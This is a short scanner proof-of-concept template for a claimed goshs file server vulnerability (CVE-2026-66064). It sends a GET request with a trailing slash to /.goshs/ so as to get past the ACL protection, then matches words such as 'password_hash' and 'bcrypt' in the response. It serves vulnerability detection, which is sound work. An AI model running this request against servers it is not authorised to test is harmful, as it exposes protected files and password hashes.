[info]
author = "AVE"
description = "检测 goshs 文件服务器 ACL 绕过漏洞，通过向请求路径末尾添加斜杠绕过 .goshs ACL 文件保护规则，未授权访问被禁止的文件"
id = "POC-AVE-2026-0942"
name = "goshs ACL Bypass via Trailing Slash PoC"
severity = "medium"
tags = ["cve-2026-66064"]
vuln_id = [
    "CVE-2026-66064",
    "AVE-2026-0942",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.goshs/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "password_hash",
    "bcrypt",
    "acl",
]
